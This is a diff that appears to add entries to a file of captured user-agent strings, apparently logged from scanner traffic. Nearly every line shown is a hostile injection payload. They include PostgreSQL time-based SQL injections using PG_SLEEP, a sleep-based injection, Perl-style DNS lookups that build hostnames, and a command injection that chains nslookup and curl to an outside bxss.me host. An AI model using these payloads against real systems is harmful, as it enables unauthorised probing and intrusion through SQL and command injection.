@@ -2512,3 +2512,6 @@ geth(ostbyname(lc('hitkk'.'lbalhibt1051b.bxss.me.')).'A'.chr(67).chr(hex('58')).
 "".gethostbyname(lc(""hitoc"".""vewrjflr2b1b8.bxss.me."").""A"".chr(67).chr(hex(""58"")).chr(120).chr(68).chr(120).chr(66)."")
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36""&&sleep(27*1000)*muaqez&&"")
 Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36vBcXlFIv' OR 104=(SELECT 104 FROM PG_SLEEP(15))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36PZUgqnMx')) OR 115=(SELECT 115 FROM PG_SLEEP(3))--)
+Mozilla/5.0 (Windows NT 10.0; Win64; x64 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36a8NlqpbX') OR 584=(SELECT 584 FROM PG_SLEEP(15))--)
+;(nslookup -q=cname hitovbbrjjcwibcc15.bxss.me||curl hitovbbrjjcwibcc15.bxss.me|(nslookup -q=cname hitovbbrjjcwibcc15.bxss.me||curl hitovbbrjjcwibcc15.bxss.me)&(nslookup -q=cname hitovbbrjjcwibcc15.bxss.me||curl hitovbbrjjcwibcc15.bxss.me))
